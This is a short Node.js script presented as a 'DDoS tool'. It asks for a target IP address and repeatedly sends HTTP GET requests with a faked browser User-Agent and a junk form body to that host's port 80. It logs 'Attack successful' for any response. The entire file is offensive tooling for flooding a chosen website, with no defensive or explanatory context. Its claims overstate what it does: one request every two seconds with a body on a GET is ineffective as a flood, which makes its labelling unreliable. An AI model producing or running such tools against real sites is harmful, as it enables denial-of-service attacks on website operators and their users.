const http = require('http');
const querystring = require('querystring');
const readline = require('readline');

const requestHeaders = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
  'Accept-Language': 'en-US,en;q=0.8'
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter the target website IP address: ', (targetIP) => {
  const options = {
    hostname: targetIP,
    port: 80,
    path: '/',
    method: 'GET',
    headers: requestHeaders
  };

  function attack() {
    setInterval(() => {
      const postData = querystring.stringify({
        'data': 'DDOS TOOL 3.0 /Sahmeran'
      });
  
      const req = http.request(options, (res) => {
        res.on('data', (chunk) => {
          console.log(`Attack successful. Response received: ${chunk}`);
        });
      });
  
      req.on('error', (e) => {
        console.error(`Error during attack: ${e.message}`);
      });
  
      req.write(postData);
      req.end();
    }, 2000);
  }

  rl.close();
  console.log(`Targeting website with IP address: ${targetIP}`);
  console.log('Launching DDoS attack...');
  attack();
});

